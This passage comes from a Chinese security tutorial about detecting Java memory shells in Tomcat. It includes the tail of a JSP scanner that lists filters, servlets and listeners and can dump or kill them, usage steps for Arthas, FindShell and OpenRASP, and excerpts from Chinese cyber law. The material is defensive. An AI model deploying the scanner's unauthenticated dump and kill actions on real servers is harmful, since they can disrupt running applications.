                        "        <th width=\"20%\">Filter class</th>\n" +
                        "        <th width=\"20%\">Filter classLoader</th>\n" +
                        "        <th width=\"25%\">Filter class file path</th>\n" +
                        "        <th width=\"5%\">dump class</th>\n" +
                        "        <th width=\"5%\">kill</th>\n" +
                        "    </thead>\n" +
                        "    <tbody>");

                HashMap<String, Object> filterConfigs = getFilterConfig(request);
                Object[] filterMaps1 = getFilterMaps(request);
                for (int i = 0; i < filterMaps1.length; i++) {
                    out.write("<tr>");
                    Object fm = filterMaps1[i];
                    Object appFilterConfig = filterConfigs.get(getFilterName(fm));
                    if (appFilterConfig == null) {
                        continue;
                    }
                    Field _filter = appFilterConfig.getClass().getDeclaredField("filter");
                    _filter.setAccessible(true);
                    Object filter = _filter.get(appFilterConfig);
                    String filterClassName = filter.getClass().getName();
                    String filterClassLoaderName = filter.getClass().getClassLoader().getClass().getName();
                    // ID Filtername 匹配路径 className classLoader 是否存在file dump kill
                    out.write(String.format("<td style=\"text-align:center\">%d</td><td>%s</td><td>%s</td><td>%s</td><td>%s</td><td>%s</td><td style=\"text-align:center\"><a href=\"?action=dump&className=%s\">dump</a></td><td style=\"text-align:center\"><a href=\"?action=kill&filterName=%s\">kill</a></td>"
                            , i + 1
                            , getFilterName(fm)
                            , arrayToString(getURLPatterns(fm))
                            , filterClassName
                            , filterClassLoaderName
                            , classFileIsExists(filter.getClass())
                            , filterClassName
                            , getFilterName(fm)));
                    out.write("</tr>");
                }
                out.write("</tbody></table>");

                // Scan servlet
                out.write("<h4>Servlet scan result</h4>");
                out.write("<table border=\"1\" cellspacing=\"0\" width=\"95%\" style=\"table-layout:fixed;word-break:break-all;background:#f2f2f2\">\n" +
                        "    <thead>\n" +
                        "        <th width=\"5%\">ID</th>\n" +
                        "        <th width=\"10%\">Servlet name</th>\n" +
                        "        <th width=\"10%\">Patern</th>\n" +
                        "        <th width=\"20%\">Servlet class</th>\n" +
                        "        <th width=\"20%\">Servlet classLoader</th>\n" +
                        "        <th width=\"25%\">Servlet class file path</th>\n" +
                        "        <th width=\"5%\">dump class</th>\n" +
                        "        <th width=\"5%\">kill</th>\n" +
                        "    </thead>\n" +
                        "    <tbody>");

                HashMap<String, Object> children = getChildren(request);
                Map<String, String> servletMappings = getServletMaps(request);

                int servletId = 0;
                for (Map.Entry<String, String> map : servletMappings.entrySet()) {
                    String servletMapPath = map.getKey();
                    String servletName1 = map.getValue();
                    StandardWrapper wrapper = (StandardWrapper) children.get(servletName1);

                    Class servletClass = null;
                    try {
                        servletClass = Class.forName(wrapper.getServletClass());
                    } catch (Exception e) {
                        Object servlet = wrapper.getServlet();
                        if (servlet != null) {
                            servletClass = servlet.getClass();
                        }
                    }
                    if (servletClass != null) {
                        out.write("<tr>");
                        String servletClassName = servletClass.getName();
                        String servletClassLoaderName = null;
                        try {
                            servletClassLoaderName = servletClass.getClassLoader().getClass().getName();
                        } catch (Exception e) {
                        }
                        out.write(String.format("<td style=\"text-align:center\">%d</td><td>%s</td><td>%s</td><td>%s</td><td>%s</td><td>%s</td><td style=\"text-align:center\"><a href=\"?action=dump&className=%s\">dump</a></td><td style=\"text-align:center\"><a href=\"?action=kill&servletName=%s\">kill</a></td>"
                                , servletId + 1
                                , servletName1
                                , servletMapPath
                                , servletClassName
                                , servletClassLoaderName
                                , classFileIsExists(servletClass)
                                , servletClassName
                                , servletName1));
                        out.write("</tr>");
                    }
                    servletId++;
                }
                out.write("</tbody></table>");

                List<Object> listeners = getListenerList(request);
                if (listeners == null || listeners.size() == 0) {
                    return;
                }
                out.write("<tbody>");
                List<ServletRequestListener> newListeners = new ArrayList<>();
                for (Object o : listeners) {
                    if (o instanceof ServletRequestListener) {
                        newListeners.add((ServletRequestListener) o);
                    }
                }

                // Scan listener
                out.write("<h4>Listener scan result</h4>");
                out.write("<table border=\"1\" cellspacing=\"0\" width=\"95%\" style=\"table-layout:fixed;word-break:break-all;background:#f2f2f2\">\n" +
                        "    <thead>\n" +
                        "        <th width=\"5%\">ID</th>\n" +
                        "        <th width=\"20%\">Listener class</th>\n" +
                        "        <th width=\"30%\">Listener classLoader</th>\n" +
                        "        <th width=\"35%\">Listener class file path</th>\n" +
                        "        <th width=\"5%\">dump class</th>\n" +
                        "        <th width=\"5%\">kill</th>\n" +
                        "    </thead>\n" +
                        "    <tbody>");

                int index = 0;
                for (ServletRequestListener listener : newListeners) {
                    out.write("<tr>");
                    out.write(String.format("<td style=\"text-align:center\">%d</td><td>%s</td><td>%s</td><td>%s</td><td style=\"text-align:center\"><a href=\"?action=dump&className=%s\">dump</a></td><td style=\"text-align:center\"><a href=\"?action=kill&servletName=%s\">kill</a></td>"
                            , index + 1
                            , listener.getClass().getName()
                            , listener.getClass().getClassLoader()
                            , classFileIsExists(listener.getClass())
                            , listener.getClass().getName()
                            , listener.getClass().getName()));
                    out.write("</tr>");
                    index++;
                }
                out.write("</tbody></table>");
            }
        %>
    </div>
    <br/>
    code by c0ny1
</center>
</body>
</html>

```

###### tomcat下运行

http://localhost:8880/ServletJspProject_war_exploded/upload/tomcat-memshell-scanner.jsp

![image-20241101173023658](https://image.201068.xyz/assets/8.Java内存马/image-20241101173023658.png)

##### Arthas

Alibaba Java诊断利器，Arthas

github：https://github.com/alibaba/arthas

下载：https://github.com/alibaba/arthas/releases/download/arthas-all-4.0.2/arthas-bin.zip

官网：https://arthas.aliyun.com/

```bash
curl -O https://arthas.aliyun.com/arthas-boot.jar
java -jar arthas-boot.jar
```

![image-20241101165844304](https://image.201068.xyz/assets/8.Java内存马/image-20241101165844304.png)

##### FindShell

内存马查杀工具，尤其针对`Agent`型

github：https://github.com/geekmc/FindShell

###### 下载

```bash
git clone https://github.com/geekmc/FindShell.git
cd FindShell
jps
java -jar FindShell.jar --pid 4152
```

![image-20241101170139373](https://image.201068.xyz/assets/8.Java内存马/image-20241101170139373.png)

![image-20241101171502289](https://image.201068.xyz/assets/8.Java内存马/image-20241101171502289.png)

###### maven打包

![image-20241101171559324](https://image.201068.xyz/assets/8.Java内存马/image-20241101171559324.png)

![image-20241101171704498](https://image.201068.xyz/assets/8.Java内存马/image-20241101171704498.png)

###### 使用

```bash
java -jar FindShell.jar -h
java -jar FindShell.jar -p 4152
```

![image-20241101171846790](https://image.201068.xyz/assets/8.Java内存马/image-20241101171846790.png)

![image-20241101171913146](https://image.201068.xyz/assets/8.Java内存马/image-20241101171913146.png)

#### RASP运行时防护

`RASP`（Runtime Application Self-Protection）是一种在应用程序运行时进行安全防护的技术。

它可以**感知到应用程序内部的各种行为**，包括**内存马在内存中的执行**。

例如，你可以在`Filter`类型的内存马创建的阶段进行`hook`，从而在早期就**检测到风险**，

RASP通常与其他安全措施（如防火墙、入侵检测系统等）**结合使用**，以提供**多层防御**。

##### 优点

1. 实时防护：能够立即检测和响应攻击。
2. 准确性强：通过在应用内部进行监控，可以更准确地识别恶意行为。
3. 误报率低：针对性的检测可以减少误判的可能性。

##### 缺点

1. 侵入性强：需要**修改应用程序代码**或**部署额外的组件**。
2. 资源消耗：可能会增加应用程序的CPU和内存使用。

##### OpenRASP

github：https://github.com/baidu/openrasp

下载地址：https://github.com/baidu/openrasp/releases/download/v1.3.7/rasp-java.zip

官网：https://rasp.baidu.com/

![image-20241101173135721](https://image.201068.xyz/assets/8.Java内存马/image-20241101173135721.png)

https://rasp.baidu.com/doc/install/software.html

![image-20241101173248219](https://image.201068.xyz/assets/8.Java内存马/image-20241101173248219.png)

![image-20241101173604846](https://image.201068.xyz/assets/8.Java内存马/image-20241101173604846.png)

```bash
cd rasp-java\rasp-2022-01-28\
java -jar RaspInstall.jar -help
```

![image-20241101173901139](https://image.201068.xyz/assets/8.Java内存马/image-20241101173901139.png)

![image-20241101173632080](https://image.201068.xyz/assets/8.Java内存马/image-20241101173632080.png)

```bash
cd rasp-java\rasp-2022-01-28\rasp\
java -jar rasp.jar -h
```

![image-20241101174009953](https://image.201068.xyz/assets/8.Java内存马/image-20241101174009953.png)

### 法律法规

**以上讲解内容仅用于信息安全教学和演示，请勿用于其他用途！**

#### 中国人民共和国网络安全法

**第十二条(第二款)**：任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得危害网络安全，不得利用网络从事危害国家安全、荣誉和利益，煽动颠覆国家政权、推翻社会主义制度，煽动分裂国家、破坏国家统一，宣扬恐怖主义、极端主义，宣扬民族仇恨、民族歧视，传播暴力、淫秽色情信息，编造、传播虚假信息扰乱经济秩序和社会秩序，以及侵害他人名誉、隐私、知识产权和其他合法权益等活动。

**第二十七条**：任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动；不得提供专门用于从事侵入网络、干扰网络正常功能及防护措施、窃取网络数据等危害网络安全活动的程序、工具；明知他人从事危害网络安全的活动的，不得为其提供技术支持、广告推广、支付结算等帮助。

**第四十四条**：任何个人和组织不得窃取或者以其他非法方式获取个人信息，不得非法出售或者非法向他人提供个人信息。

**第六十三条**：违反本法第二十七条规定，从事危害网络安全的活动，或者提供专门用于从事危害网络安全活动的程序、工具，或者为他人从事危害网络安全的活动提供技术支持、广告推广、支付结算等帮助，尚不构成犯罪的，由公安机关没收违法所得，处五日以下拘留，可以并处五万元以上五十万元以下罚款；情节较重的，处五日以上十五日以下拘留，可以并处十万元以上一百万元以下罚款。单位有前款行为的，由公安机关没收违法所得，处十万元以上一百万元以下罚款，并对直接负责的主管人员和其他直接责任人员依照前款规定处罚。违反本法第二十七条规定，受到治安管理处罚的人员，五年内不得从事网络安全管理和网络运营关键岗位的工作；受到刑事处罚的人员，终身不得从事网络安全管理和网络运营关键岗位的工作。

**第六十四条(第二款)**：违反本法第四十四条规定，窃取或者以其他非法方式获取、非法出售或者非法向他人提供个人信息，尚不构成犯罪的，由公安机关没收违法所得，并处违法所得一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款。

#### 中国人民共和国刑法

**第二百八十五条**：违反国家规定，侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。违反国家规定，侵入前款规定以外的计算机信息系统或者采用其他技术手段，获取该计算机信息系统中存储、处理或者传输的数据，或者对该计算机信息系统实施非法控制，情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金；情节特别严重的，处三年以上七年以下有期徒刑，并处罚金。提供专门用于侵入、非法控制计算机信息系统的程序、工具，或者明知他人实施侵入、非法控制计算机信息系统的违法犯罪行为而为其提供程序、工具，情节严重的，依照前款的规定处罚。单位犯前三款罪的，对单位判处罚金，并对其直接负责的主管人员和其他直接责任人员，依照各该款的规定处罚。
第二百八十六条：违反国家规定，对计算机信息系统功能进行删除、修改、增加、干扰，造成计算机信息系统不能正常运行，后果严重的，处五年以下有期徒刑或者拘役；后果特别严重的，处五年以上有期徒刑。违反国家规定，对计算机信息系统中存储、处理或者传输的数据和应用程序进行删除、修改、增加的操作，后果严重的，依照前款的规定处罚。故意制作、传播计算机病毒等破坏性程序，影响计算机系统正常运行，后果严重的，依照第一款的规定处罚。单位犯前三款罪的，对单位判处罚金，并对其直接负责的主管人员和其他直接责任人员，依照第一款的规定处罚。

**第二百八十六条**：违反国家规定，对计算机信息系统功能进行删除、修改、增加、干扰，造成计算机信息系统不能正常运行，后果严重的，处五年以下有期徒刑或者拘役；后果特别严重的，处五年以上有期徒刑。违反国家规定，对计算机信息系统中存储、处理或者传输的数据和应用程序进行删除、修改、增加的操作，后果严重的，依照前款的规定处罚。故意制作、传播计算机病毒等破坏性程序，影响计算机系统正常运行，后果严重的，依照第一款的规定处罚。单位犯前三款罪的，对单位判处罚金，并对其直接负责的主管人员和其他直接责任人员，依照第一款的规定处罚。

**第二百八十六条之一**： 网络服务提供者不履行法律、行政法规规定的信息网络安全管理义务，经监管部门责令采取改正措施而拒不改正，有下列情形之一的，处三年以下有期徒刑、拘役或者管制，并处或者单处罚金：

（一）致使违法信息大量传播的；

（二）致使用户信息泄露，造成严重后果的；

（三）致使刑事案件证据灭失，情节严重的；

（四）有其他严重情节的。

单位犯前款罪的，对单位判处罚金，并对其直接负责的主管人员和其他直接责任人员，依照前款的规定处罚。有前两款行为，同时构成其他犯罪的，依照处罚较重的规定定罪处罚。

**第二百八十七条** 利用计算机实施金融诈骗、盗窃、贪污、挪用公款、窃取国家秘密或者其他犯罪的，依照本法有关规定定罪处罚。

**第二百八十七条之一** 利用信息网络实施下列行为之一，情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金：

（一）设立用于实施诈骗、传授犯罪方法、制作或者销售违禁物品、管制物品等违法犯罪活动的网站、通讯群组的；

（二）发布有关制作或者销售毒品、枪支、淫秽物品等违禁物品、管制物品或者其他违法犯罪信息的；

（三）为实施诈骗等违法犯罪活动发布信息的。单位犯前款罪的，对单位判处罚金，并对其直接负责的主管人员和其他直接责任人员，依照第一款的规定处罚。

有前两款行为，同时构成其他犯罪的，依照处罚较重的规定定罪处罚。

**第二百八十七条之二** 明知他人利用信息网络实施犯罪，为其犯罪提供互联网接入、服务器托管、网络存储、通讯传输等技术支持，或者提供广告推广、支付结算等帮助，情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金。

单位犯前款罪的，对单位判处罚金，并对其直接负责的主管人员和其他直接责任人员，依照第一款的规定处罚。

有前两款行为，同时构成其他犯罪的，依照处罚较重的规定定罪处罚。

### 结语

![image-20241101091151869](https://image.201068.xyz/assets/8.Java内存马/image-20241101091151869.png)
